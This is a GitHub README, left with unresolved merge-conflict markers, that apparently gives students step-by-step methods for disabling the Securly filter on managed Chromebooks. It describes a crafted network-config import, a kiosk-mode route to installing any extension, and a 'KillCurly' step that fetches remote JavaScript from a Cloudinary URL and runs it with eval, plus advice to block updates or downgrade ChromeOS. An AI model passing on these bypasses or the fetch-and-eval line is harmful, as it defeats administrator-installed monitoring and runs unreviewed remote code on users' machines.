<<<<<<< HEAD
Note: You should NOT open an issue with @zek-c, he will get mad if you don't put something simple (as proven [here](https://github.com/zek-c/Securly-Kill-V111/issues/38)).
=======
## NEW EXPLOIT (by [dragon731012](https://github.com/dragon731012)), [cauDNS!](https://github.com/dragon731012/caudns)
<br>
usage instructions: 
<hr>
    Head to <a href="https://caudns.vercel.app">Dragon's Vercel</a> or my <a href="https://zekcurly.netlify.app/cauDNS.html">mirror</a>
    <hr>
        head to chrome://network#state, and expand your most commonly used wifi networks then copy the contents
        <hr> 
            Paste contents into the input field, and generate the file, then import it at the bottom of chrome://network#general
            <hr>
that should be it, you've successfully blocked multiple extensions

# as of ChromeOS V119, all of these below methods are patched. use [caub](https://caub.glitch.me/old) to stop updates or [downgrade](https://chrome100.dev) to keep these exploits working
<hr>

# before you use insecurly
<br>
bypassi has found yet another awesome exploit,
both links are <a href="https://skiovox.com">here</a> and <a href="https://github.com/bypassiwastaken/skiovox-helper">here</a>. this exploit allows you to go into a browser in kiosk mode and install ANY extension you want and do anything you want. please consider this before insecurly, as it always works and is working on every version (you must have kiosk apps)
>>>>>>> 7df6cf33677ad41557f380805b2cd21dd7643996

# KillCurly Working
@zek-c's KillCurly exploit, but working.

### Feel free to follow the instructions below:

From [3kh0](https://3kh0.github.io/ext-remover/)'s `ext-remover` thingy (in the case that uBlock isn't blocked as an installable extension), I found a way to make the KillCurly exploit work 🎉

Essentially, you would follow the instructions [here](https://3kh0.github.io/ext-remover/#ublock-run-run-code-on-pages).

Once you have that done, you would press `ctrl`**+**`alt`**+**`~` until you see the `Eval: ` alert. 

Then you would evaluate:

``` javascript
fetch('https://res.cloudinary.com/dxttxbdrd/raw/upload/v1693510756/kill_qn1hjn.js').then(r => r.text()).then(r => eval(r))
```

Since this is JavaScript evaluation only, you wouldn't put the `javascript:` like you would in a bookmarklet.

I recommend going to [Securly](https://www.securly.com) to do all of this because that's where the kill script is meant to work.

If this doesn't work, you would use Bypassi's INSECURLY exploit or Skiovox.

I hope you guys enjoy this 🫰
